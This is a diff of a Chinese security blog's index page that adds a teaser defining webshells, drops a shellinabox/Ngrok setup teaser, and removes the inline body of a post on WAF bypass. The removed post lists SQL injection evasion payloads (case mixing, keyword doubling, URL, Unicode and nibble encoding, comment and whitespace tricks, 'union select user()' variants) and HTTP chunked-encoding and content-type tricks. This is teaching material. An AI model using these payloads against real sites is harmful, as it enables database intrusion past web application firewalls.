@@ -296,6 +296,152 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://chirec.github.io/2019/04/19/Upload-Files/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="chessur">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Emerald Dream">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/04/19/Upload-Files/" class="post-title-link" itemprop="url">'文件上传总结'</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2019-04-19 19:56:07" itemprop="dateCreated datePublished" datetime="2019-04-19T19:56:07+08:00">2019-04-19</time>
+            
+
+            
+          </span>
+
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <h1 id="1-WebShell"><a href="#1-WebShell" class="headerlink" title="1. WebShell"></a>1. WebShell</h1><h4 id="什么是Shell"><a href="#什么是Shell" class="headerlink" title="什么是Shell"></a>什么是Shell</h4><p>Shell是系统的用户界面，提供了用户与内核进行交互操作的一种接口。它接收用户输入的命令并把它送入内核去执行。因为系统内核使我们不能直接操作的，shell就给我们提供了一个接口，通过shell我们可以把命令送入到内核。shell管理用户与操作系统之间的交互：等待你输入，向操作系统解释你的输入，并且处理各种各样的操作系统的输出结果。<br>传统意义上的shell指的是命令行式的shell，以后如果不特别注明，shell是指命令行式的shell。<br>表示用户拥有的权限，不同的shell权限不同</p>
+<h4 id="WebShell"><a href="#WebShell" class="headerlink" title="WebShell"></a>WebShell</h4><p>黑客在入侵了一个网站后，通常会留下一个asp或php后门文件与网站web服务器进行交互，得到一个命令执行环境，以达到控制网站服务器的目的。这个后门文件就是所谓的webshell。</p>
+          <!--noindex-->
+          
+            <div class="post-button text-center">
+              <a class="btn" href="/2019/04/19/Upload-Files/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://chirec.github.io/2019/04/17/Play-with-WAF/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -377,182 +523,16 @@
 
       
         
+          <h1 id="1-WAF"><a href="#1-WAF" class="headerlink" title="1.WAF"></a>1.WAF</h1><h2 id="1-1-WAF介绍"><a href="#1-1-WAF介绍" class="headerlink" title="1.1 WAF介绍"></a>1.1 WAF介绍</h2><p>WAF是Web Application Firewall的简称。中文名为Web应用防护系统，也称网站应用级入侵防御系统。</p>
+          <!--noindex-->
           
-            <h1 id="1-WAF"><a href="#1-WAF" class="headerlink" title="1.WAF"></a>1.WAF</h1><h2 id="1-1-WAF介绍"><a href="#1-1-WAF介绍" class="headerlink" title="1.1 WAF介绍"></a>1.1 WAF介绍</h2><p>WAF是Web Application Firewall的简称。中文名为Web应用防护系统，也称网站应用级入侵防御系统。</p>
-<h2 id="1-2-WAF作用"><a href="#1-2-WAF作用" class="headerlink" title="1.2 WAF作用"></a>1.2 WAF作用</h2><h3 id="1-2-1-网络层防护"><a href="#1-2-1-网络层防护" class="headerlink" title="1.2.1 网络层防护"></a>1.2.1 网络层防护</h3><p>拦截DDOS攻击、防御SYN Flood、防御Ack Flood、防御Http/Https Flood</p>
-<h3 id="1-2-2-应用层防护"><a href="#1-2-2-应用层防护" class="headerlink" title="1.2.2 应用层防护"></a>1.2.2 应用层防护</h3><p>URL黑白名单、HTTP协议规范、防御注入攻击、防御XSS攻击、防御XXE</p>
-<h3 id="1-3-分类"><a href="#1-3-分类" class="headerlink" title="1.3 分类"></a>1.3 分类</h3><p>代码WAF：规则写在代码中</p>
-<p>软件WAF：实时监听端口(服务)</p>
-<p>硬件WAF：专门的硬件设备 代理流量 分析流量 网络镜像</p>
-<p>云WAF：流量传到检测节点中做检测</p>
-<h3 id="1-4-工作流程"><a href="#1-4-工作流程" class="headerlink" title="1.4 工作流程"></a>1.4 工作流程</h3><h4 id="1-4-1-身份验证"><a href="#1-4-1-身份验证" class="headerlink" title="1.4.1 身份验证"></a>1.4.1 身份验证</h4><p>白名单(IP、cookie、useragent、referer)<br>黑名单</p>
-<h4 id="1-4-2-数据包解析"><a href="#1-4-2-数据包解析" class="headerlink" title="1.4.2 数据包解析"></a>1.4.2 数据包解析</h4><h4 id="1-4-3-匹配规则"><a href="#1-4-3-匹配规则" class="headerlink" title="1.4.3 匹配规则"></a>1.4.3 匹配规则</h4><p>ACL(访问控制列表)</p>
-<h1 id="2-Bypass常用方法"><a href="#2-Bypass常用方法" class="headerlink" title="2.Bypass常用方法"></a>2.Bypass常用方法</h1><h2 id="2-1-大小写"><a href="#2-1-大小写" class="headerlink" title="2.1 大小写"></a>2.1 大小写</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=&apos;1 &apos; uNion SelEct 1,2,3,4 --+</span><br></pre></td></tr></table></figure>
-<h2 id="2-2-替换关键字-关键字重复写"><a href="#2-2-替换关键字-关键字重复写" class="headerlink" title="2.2 替换关键字(关键字重复写)"></a>2.2 替换关键字(关键字重复写)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1 ununionion selselectect</span><br></pre></td></tr></table></figure>
-<h2 id="2-3-编码"><a href="#2-3-编码" class="headerlink" title="2.3 编码"></a>2.3 编码</h2><h3 id="2-3-1-URL编码"><a href="#2-3-1-URL编码" class="headerlink" title="2.3.1 URL编码"></a>2.3.1 URL编码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1 %75nion select</span><br></pre></td></tr></table></figure>
-<h3 id="2-3-2-二次URL编码"><a href="#2-3-2-二次URL编码" class="headerlink" title="2.3.2 二次URL编码"></a>2.3.2 二次URL编码</h3><p>将URL编码两次</p>
-<h3 id="2-3-3-错误URL编码"><a href="#2-3-3-错误URL编码" class="headerlink" title="2.3.3 错误URL编码"></a>2.3.3 错误URL编码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">union select password from users where id=1</span><br><span class="line">u%nion sel%ect password fr%om users wh%ere id=1</span><br></pre></td></tr></table></figure>
-<p>在注入关键词处加上%，WAF会将其取出</p>
-<h3 id="2-3-4-Unicode编码"><a href="#2-3-4-Unicode编码" class="headerlink" title="2.3.4 Unicode编码"></a>2.3.4 Unicode编码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">union select password from users where id=1</span><br><span class="line">%u0075%u006e%u0069%u006f%u006e select password from users where id=1</span><br></pre></td></tr></table></figure>
-<p>Unicode编码</p>
-<h3 id="2-3-5-Nibble编码"><a href="#2-3-5-Nibble编码" class="headerlink" title="2.3.5 Nibble编码"></a>2.3.5 Nibble编码</h3><p>Nibble编码是针对URL编码的%后两位进行二次编码的一种方法。<br>根据编码位置不同，被分为First Nibble、Second Nibble以及Double Nibble三种。</p>
-<table>
-<thead>
-<tr>
-<th>Type</th>
-<th>Transformation of %61</th>
-<th>Result</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>First Nibble</td>
-<td>6 = %36</td>
-<td>%%361</td>
-</tr>
-<tr>
-<td>Second Nibble</td>
-<td>1 = %31</td>
-<td>%6%31</td>
-</tr>
-<tr>
-<td>Double Nibble</td>
-<td>6 = %36 1 = %31</td>
-<td>%%36%31</td>
-</tr>
-</tbody>
-</table>
-<h3 id="2-3-6错误16进制编码"><a href="#2-3-6错误16进制编码" class="headerlink" title="2.3.6错误16进制编码"></a>2.3.6错误16进制编码</h3><table>
-<thead>
-<tr>
-<th>Hex Character</th>
-<th>Conversion</th>
-<th>Decimal</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>%61</td>
-<td>6*16+1</td>
-<td>97</td>
-</tr>
-<tr>
-<td>%2ú</td>
-<td>2*16+65</td>
-<td>97</td>
-</tr>
-</tbody>
-</table>
-<h2 id="2-4-内联注释"><a href="#2-4-内联注释" class="headerlink" title="2.4 内联注释"></a>2.4 内联注释</h2><p><code>/* */</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1 union/**/</span><br></pre></td></tr></table></figure>
-<h2 id="2-5-等价函数替换"><a href="#2-5-等价函数替换" class="headerlink" title="2.5 等价函数替换"></a>2.5 等价函数替换</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">version @@version</span><br><span class="line">mid substr substring</span><br><span class="line">@@datadir datadir()</span><br></pre></td></tr></table></figure>
-<h2 id="2-6-特殊符号"><a href="#2-6-特殊符号" class="headerlink" title="2.6 特殊符号"></a>2.6 特殊符号</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">+</span><br><span class="line">#</span><br><span class="line">%23</span><br><span class="line">--+</span><br><span class="line">\\\\</span><br><span class="line">||</span><br><span class="line">select`version()`</span><br><span class="line">@ 用户自定义变量</span><br><span class="line">@@ 系统变量</span><br><span class="line">se||lect</span><br><span class="line">%df宽字节</span><br><span class="line">注释符+%0a绕过</span><br></pre></td></tr></table></figure>
-<h2 id="2-7-内联注释加！"><a href="#2-7-内联注释加！" class="headerlink" title="2.7 内联注释加！"></a>2.7 内联注释加！</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/*!union*/</span><br></pre></td></tr></table></figure>
-<h2 id="2-8-缓冲区溢出"><a href="#2-8-缓冲区溢出" class="headerlink" title="2.8 缓冲区溢出"></a>2.8 缓冲区溢出</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and (select 1)=(select 0xAAAAAAAAAAAA*1000) union select 1,2 verion(),4,5,database(),8,9,10,11,12,13,14,15,16,17,18</span><br></pre></td></tr></table></figure>
-<p>0xA*1000指有1000个A</p>
-<h2 id="2-9-mysql特性绕过"><a href="#2-9-mysql特性绕过" class="headerlink" title="2.9 mysql特性绕过"></a>2.9 mysql特性绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">= 等于</span><br><span class="line">:= 赋值</span><br><span class="line">@ @+变量名可直接调用</span><br></pre></td></tr></table></figure>
-<h2 id="2-10-隐私类型转换"><a href="#2-10-隐私类型转换" class="headerlink" title="2.10 隐私类型转换"></a>2.10 隐私类型转换</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select &apos;a&apos;=0;</span><br><span class="line">select &apos;1admin&apos;=1;</span><br></pre></td></tr></table></figure>
-<h2 id="2-11-综合探索"><a href="#2-11-综合探索" class="headerlink" title="2.11 综合探索"></a>2.11 综合探索</h2><p>内联注释<br>黑魔法</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select&#123;x user&#125;from&#123;x mysql.user&#125;</span><br></pre></td></tr></table></figure>
-<p>换行符绕过：%23%0a %2d%2d%0a</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from admin where id=1[1] union [2]select [3]1,user()[4]from[5]admin</span><br><span class="line">//[]表示检测点</span><br></pre></td></tr></table></figure>
-<h3 id="2-11-1"><a href="#2-11-1" class="headerlink" title="2.11.1"></a>2.11.1</h3><h5 id="1-："><a href="#1-：" class="headerlink" title="[1]："></a>[1]：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/**/ /*!50000union*/</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">空白 %09 %0a %0b %0c %0d %20</span><br><span class="line">id=1%0bunion select 1,user() from admin</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">浮点数形式</span><br><span class="line">id=1.0union select 1,user() from admin</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1E0</span><br><span class="line">id=1E0union select 1,user() from admin</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\</span><br><span class="line">id=\Nunion select 1,user() from admin</span><br></pre></td></tr></table></figure>
-<h3 id="2-11-2"><a href="#2-11-2" class="headerlink" title="2.11.2"></a>2.11.2</h3><h5 id="2-："><a href="#2-：" class="headerlink" title="[2]："></a>[2]：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">空白</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注释符</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">括号</span><br><span class="line">id=1 union(select &apos;test&apos;,(select user()from admin limit 0,1))</span><br></pre></td></tr></table></figure>
-<h3 id="2-11-3"><a href="#2-11-3" class="headerlink" title="2.11.3"></a>2.11.3</h3><h5 id="3-："><a href="#3-：" class="headerlink" title="[3]："></a>[3]：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">空白</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注释符</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">其他字符</span><br><span class="line">！ %21</span><br><span class="line">+ %2b</span><br><span class="line">- %2d</span><br><span class="line">@ %40</span><br><span class="line">~ %7e</span><br><span class="line">id=1 union select~1,user(),version() from admin</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">括号</span><br><span class="line">id=1 union select(1),user(),version() from admin</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">内联注释</span><br><span class="line">id=1 union /*!500000select*/ 1,user(),version() from admin</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#125;</span><br><span class="line">id=1 union select&#123;x 1&#125;,user(),version() from admin</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;</span><br><span class="line">id=1 union select&quot;1&quot;,user(),version() from admin</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\N</span><br><span class="line">id=1 union select\N,user(),version() from admin</span><br></pre></td></tr></table></figure>
-<h3 id="2-11-4"><a href="#2-11-4" class="headerlink" title="2.11.4"></a>2.11.4</h3><h5 id="4-："><a href="#4-：" class="headerlink" title="[4]："></a>[4]：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">空白</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注释符</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">其他字符</span><br><span class="line">` %60</span><br><span class="line">id=1 union select 1,user(),version()`from admin`</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">内联注释</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">括号</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">加字母</span><br><span class="line">id=1 union select 1,user(),version()Afrom admin</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">浮点数、1E0、\N</span><br></pre></td></tr></table></figure>
-<h3 id="2-11-5"><a href="#2-11-5" class="headerlink" title="2.11.5"></a>2.11.5</h3><h5 id="5-："><a href="#5-：" class="headerlink" title="[5]："></a>[5]：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">空白</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注释符</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">其他符号</span><br><span class="line">中文破折号</span><br><span class="line">id=1 union select 1,user(),version() from——admin</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">内联注释</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#125;</span><br><span class="line">id=1 union select 1,user(),version() from&#123;x admin&#125;</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">()</span><br></pre></td></tr></table></figure>
-<table>
-<thead>
-<tr>
-<th style="text-align:center">1</th>
-<th style="text-align:center">2</th>
-<th style="text-align:center">2</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center">1</td>
-<td style="text-align:center">2</td>
-<td style="text-align:center">2</td>
-</tr>
-<tr>
-<td style="text-align:center">1</td>
-<td style="text-align:center">2</td>
-<td style="text-align:center">2</td>
-</tr>
-<tr>
-<td style="text-align:center"></td>
-<td style="text-align:center"></td>
-</tr>
-</tbody>
-</table>
-<h3 id="2-12-空白"><a href="#2-12-空白" class="headerlink" title="2.12 空白"></a>2.12 空白</h3><table>
-<thead>
-<tr>
-<th style="text-align:center">RDBMS</th>
-<th style="text-align:center">Allowed  whitespaces</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center">SQLite 3</td>
-<td style="text-align:center">0A,0D,0C,09,20</td>
-</tr>
-<tr>
-<td style="text-align:center">MySQL 5</td>
-<td style="text-align:center">09,0A,0B,0C,0D,A0,20</td>
-</tr>
-<tr>
-<td style="text-align:center">Oracle 11g</td>
-<td style="text-align:center">00,09,0A,0B,0C,0D,20</td>
-</tr>
-<tr>
-<td style="text-align:center">MSSQL 2008</td>
-<td style="text-align:center">01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20,25</td>
-</tr>
-</tbody>
-</table>
-<h4 id="2-13-特殊位置代替空格"><a href="#2-13-特殊位置代替空格" class="headerlink" title="2.13 特殊位置代替空格"></a>2.13 特殊位置代替空格</h4><p>科学计数法(1e0,.)<br>数学计算(+-*/)<br>特殊字符(\N)<br>注释符(/**/)</p>
-<h5 id="2-14-无空格的查询"><a href="#2-14-无空格的查询" class="headerlink" title="2.14 无空格的查询"></a>2.14 无空格的查询</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1e0and&#123;``select(left(database(),1))&#125;</span><br></pre></td></tr></table></figure>
-<h1 id="3-基于HTTP协议的绕过方式"><a href="#3-基于HTTP协议的绕过方式" class="headerlink" title="3. 基于HTTP协议的绕过方式"></a>3. 基于HTTP协议的绕过方式</h1><p>OWASP AppSec Europe<br>WAF Bypass Techniques-Using HTTP Standard and Web Servers’ Behaviour -- Soroush Dalili</p>
-<h2 id="3-1-基于HTTP0-9协议的绕过方式"><a href="#3-1-基于HTTP0-9协议的绕过方式" class="headerlink" title="3.1 基于HTTP0.9协议的绕过方式"></a>3.1 基于HTTP0.9协议的绕过方式</h2><h2 id="3-2-HTTP隧道传输-HTTP-pipline"><a href="#3-2-HTTP隧道传输-HTTP-pipline" class="headerlink" title="3.2 HTTP隧道传输/HTTP pipline"></a>3.2 HTTP隧道传输/HTTP pipline</h2><p><img src="/2019/04/17/Play-with-WAF/1555423819940.png" alt="1555423819940"></p>
-<p>通过BP拦包，在一个请求下添加多个请求，注意需要修改</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Connection:keep-alive</span><br><span class="line">Content-Length:</span><br></pre></td></tr></table></figure>
-<h2 id="3-3-畸形包"><a href="#3-3-畸形包" class="headerlink" title="3.3 畸形包"></a>3.3 畸形包</h2><p><img src="/2019/04/17/Play-with-WAF/1555462234327.png" alt="1555462234327"></p>
-<p>由于<code>c=2&amp;d=2</code>后面的内容WAF并能不识别，所以GET后面的Payload没有被WAF拦截掉</p>
-<h2 id="3-4-分块传输-Chunked-Transfer"><a href="#3-4-分块传输-Chunked-Transfer" class="headerlink" title="3.4 分块传输/Chunked Transfer"></a>3.4 分块传输/Chunked Transfer</h2><p>通过使用HTTP头<code>Transfer-Encoding:chunked</code>设置达到分割参数的效果<br>在HTTP/1.1下使用</p>
-<p>奇数行表示下一行的数据长度，使用16机制表示<br>偶数行表示传输的数据<br>在最后一行写0，并在0后写入多个回车<br>0后没有回车会没有响应</p>
-<h2 id="3-5-协议未覆盖"><a href="#3-5-协议未覆盖" class="headerlink" title="3.5 协议未覆盖"></a>3.5 协议未覆盖</h2><p>以下四种常见的content-type类型，我们可以尝试互相替换尝试绕过WAF过滤机制。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Content-Type:text/html;charset=UTF-8</span><br><span class="line">Content-Type:application/json;charset=utf-8</span><br><span class="line">Content-Type:application/x-www-form-urlencoded;charset=utf-8</span><br><span class="line">Content-Type:multipart/form-data;boundary=something</span><br></pre></td></tr></table></figure>
-<p>注：如图常见的绕过方式为使用multipart/form-data标签，并把name设为参数名内容写入注入语句。</p>
-<h1 id="参考"><a href="#参考" class="headerlink" title=".参考"></a>.参考</h1><p>[1] <a href="https://www.bilibili.com/video/av34035812" target="_blank" rel="noopener">漏洞银行丨一般人我不告诉的WAF绕过新姿势-1337G丨咖面74期</a></p>
-<p>[2] <a href="https://soroush.secproject.com/blog/2017/09/additional-notes-on-a-forgotten-http-invisibility-cloak-talk/" target="_blank" rel="noopener">Additional notes on “A Forgotten HTTP Invisibility Cloak” talk!</a></p>
-
+            <div class="post-button text-center">
+              <a class="btn" href="/2019/04/17/Play-with-WAF/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
           
+          <!--/noindex-->
         
       
     </div>
@@ -1811,155 +1791,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://chirec.github.io/2019/03/21/Kail-Use-Shellinabox&Ngrok/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="chessur">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Emerald Dream">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/03/21/Kail-Use-Shellinabox&Ngrok/" class="post-title-link" itemprop="url">'Kali使用shellinabox，并使用Ngrok将shellinabox映射到外网'</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-
-              
-                
-              
-
-              <time title="Created: 2019-03-21 19:49:19" itemprop="dateCreated datePublished" datetime="2019-03-21T19:49:19+08:00">2019-03-21</time>
-            
-
-            
-          </span>
-
-          
-
-          
-            
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <h1 id="1-shellinabox介绍"><a href="#1-shellinabox介绍" class="headerlink" title="1.shellinabox介绍"></a>1.shellinabox介绍</h1><p>Shellinabox 是一个利用 Ajax 技术构建的基于 Web 浏览器的远程终端模拟器，安装该软件后，服务器端不需要开启 ssh服务，通过 Web 浏览器就可以对远程主机进行操作。使用来登录到系统<a href="http://IP:4200" target="_blank" rel="noopener">http://IP:4200</a>，在启用了SSL/TLS证书，需要用<a href="http://IP:4200" target="_blank" rel="noopener">http://IP:4200</a>来登录。默认情况下shellinabox使用的是4200端口。</p>
-<h1 id="2-shellinabox安装"><a href="#2-shellinabox安装" class="headerlink" title="2.shellinabox安装"></a>2.shellinabox安装</h1><p>使用的是系统是Kali Linux 2019，在终端输入</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install shellinabox</span><br></pre></td></tr></table></figure>
-<p>如果提示无法找到包，请添加国内更新源</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gedit /etc/apt/sources.list</span><br><span class="line">//添加下列更新源</span><br><span class="line">#清华大学 [更新源]</span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free </span><br><span class="line">deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free </span><br><span class="line"></span><br><span class="line">#浙江大学[更新源]</span><br><span class="line">deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free </span><br><span class="line">deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span><br></pre></td></tr></table></figure>
-          <!--noindex-->
-          
-            <div class="post-button text-center">
-              <a class="btn" href="/2019/03/21/Kail-Use-Shellinabox&Ngrok/#more" rel="contents">
-                Read more &raquo;
-              </a>
-            </div>
-          
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2006,7 +1837,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">13</span>
